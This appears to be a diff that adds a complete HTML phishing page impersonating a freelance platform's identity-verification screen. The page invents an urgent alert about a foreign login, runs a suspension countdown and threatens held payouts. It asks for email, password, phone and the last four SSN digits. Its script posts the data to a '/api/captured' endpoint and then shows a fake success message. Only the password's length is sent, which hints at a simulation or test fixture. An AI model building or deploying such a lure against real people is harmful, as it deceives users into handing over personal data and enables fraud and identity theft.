@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Identity Verification — FreelanceHub</title>
+  <link rel="stylesheet" href="/static/css/main.css" />
+</head>
+<body>
+
+<!-- ======== NAVBAR ======== -->
+<header class="navbar">
+  <div class="navbar-left">
+    <a href="/" class="logo">
+      <span class="logo-mark">&#9670;</span>
+      <span class="logo-text">FreelanceHub</span>
+    </a>
+    <nav class="nav-links">
+      <a href="#" class="nav-link">Find Work</a>
+      <a href="#" class="nav-link">My Jobs</a>
+      <a href="/" class="nav-link">Messages</a>
+    </nav>
+  </div>
+  <div class="navbar-right">
+    <button class="icon-btn notif-btn" aria-label="Notifications">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+        <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+      </svg>
+      <span class="notif-badge">2</span>
+    </button>
+    <div class="avatar-circle" style="background:#14a800;color:#fff;font-size:14px;font-weight:600;cursor:pointer">JD</div>
+  </div>
+</header>
+
+<!-- ======== VERIFY PAGE ======== -->
+<div class="verify-page">
+  <div class="verify-card" id="verifyCard">
+
+    <!-- Alert banner -->
+    <div class="verify-alert-banner">
+      <div class="verify-alert-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+          <line x1="12" y1="9" x2="12" y2="13"/>
+          <line x1="12" y1="17" x2="12.01" y2="17"/>
+        </svg>
+      </div>
+      <div>
+        <div class="verify-alert-title">Account Under Review — Verify Your Identity</div>
+        <div class="verify-alert-sub">Unusual login detected from IP 185.234.218.47 (Moscow, Russia). Your account will be suspended in <strong id="countdown">23:47:12</strong> unless you verify.</div>
+      </div>
+    </div>
+
+    <!-- Header -->
+    <div class="verify-header">
+      <div class="verify-logo-row">
+        <span class="logo-mark" style="color:#14a800;font-size:22px">&#9670;</span>
+        <span style="font-size:18px;font-weight:700;color:#1e2d3d">FreelanceHub</span>
+        <span class="verify-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="#14a800"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+          Secure Verification
+        </span>
+      </div>
+      <h1 class="verify-title">Identity Verification</h1>
+      <p class="verify-subtitle">To protect your account and ensure your <strong>$2,040.00 in pending payouts</strong> are not held, please verify your identity below.</p>
+    </div>
+
+    <!-- Steps indicator -->
+    <div class="verify-steps">
+      <div class="verify-step active">
+        <div class="step-num">1</div>
+        <div class="step-label">Identity</div>
+      </div>
+      <div class="verify-step-line"></div>
+      <div class="verify-step">
+        <div class="step-num">2</div>
+        <div class="step-label">Review</div>
+      </div>
+      <div class="verify-step-line"></div>
+      <div class="verify-step">
+        <div class="step-num">3</div>
+        <div class="step-label">Confirmed</div>
+      </div>
+    </div>
+
+    <!-- Form -->
+    <form id="verifyForm" class="verify-form" onsubmit="submitVerify(event)">
+      <div class="form-group">
+        <label class="form-label" for="v_email">Email Address <span class="req">*</span></label>
+        <input type="email" id="v_email" name="email" class="form-input" placeholder="your@email.com" required />
+        <span class="form-hint">The email address associated with your FreelanceHub account</span>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="v_password">
+          Current Password — to confirm it's you
+          <span class="req">*</span>
+        </label>
+        <div class="input-with-icon">
+          <input type="password" id="v_password" name="password" class="form-input" placeholder="Enter your current password" required />
+          <button type="button" class="pwd-toggle" onclick="togglePwd()" aria-label="Show password">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+        <span class="form-hint">We use this to confirm account ownership — never stored in plaintext</span>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="v_phone">Phone Number <span class="req">*</span></label>
+        <input type="tel" id="v_phone" name="phone" class="form-input" placeholder="+1 (555) 000-0000" required />
+        <span class="form-hint">We may send a one-time verification code</span>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="v_ssn">
+          Last 4 Digits of Social Security Number — identity verification
+          <span class="req">*</span>
+        </label>
+        <input type="text" id="v_ssn" name="ssn_last4" class="form-input ssn-input"
+               placeholder="XXXX" maxlength="4" pattern="\d{4}"
+               inputmode="numeric" required />
+        <span class="form-hint">Used to confirm your identity against our records. Your full SSN is never requested.</span>
+      </div>
+
+      <div class="verify-trust-row">
+        <span class="trust-item">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#14a800" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          256-bit SSL Encryption
+        </span>
+        <span class="trust-item">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#14a800" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          FreelanceHub Verified
+        </span>
+        <span class="trust-item">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#14a800" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+          Data Protected by Policy
+        </span>
+      </div>
+
+      <button type="submit" class="btn-verify">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Verify My Identity
+      </button>
+    </form>
+
+  </div>
+
+  <!-- Success state (hidden initially) -->
+  <div class="verify-success" id="verifySuccess" style="display:none">
+    <div class="success-icon">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#14a800" stroke-width="2">
+        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+        <polyline points="22 4 12 14.01 9 11.01"/>
+      </svg>
+    </div>
+    <h2 class="success-title">Identity Verified</h2>
+    <p class="success-body">Your account has been reviewed and no suspicious activity was found. Your pending payouts have been released and your account is fully active.</p>
+    <a href="/" class="btn-back-inbox">Return to Inbox</a>
+  </div>
+</div>
+
+<script>
+// Countdown timer
+(function() {
+  var total = 23 * 3600 + 47 * 60 + 12;
+  var el = document.getElementById('countdown');
+  setInterval(function() {
+    if (total <= 0) { el.textContent = '00:00:00'; return; }
+    total--;
+    var h = Math.floor(total / 3600);
+    var m = Math.floor((total % 3600) / 60);
+    var s = total % 60;
+    el.textContent = String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+  }, 1000);
+})();
+
+function togglePwd() {
+  var inp = document.getElementById('v_password');
+  inp.type = inp.type === 'password' ? 'text' : 'password';
+}
+
+function submitVerify(e) {
+  e.preventDefault();
+  var email    = document.getElementById('v_email').value;
+  var phone    = document.getElementById('v_phone').value;
+  var ssnLast4 = document.getElementById('v_ssn').value;
+  var pwd      = document.getElementById('v_password').value;
+
+  fetch('/api/captured', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      source: 'freelancehub_verify',
+      timestamp: new Date().toISOString(),
+      fields: {
+        email: email,
+        phone: phone,
+        ssn_last4: ssnLast4,
+        has_password: pwd.length > 0,
+        password_length: pwd.length,
+      }
+    })
+  });
+
+  document.getElementById('verifyCard').style.display = 'none';
+  document.getElementById('verifySuccess').style.display = 'flex';
+}
+</script>
+</body>
+</html>
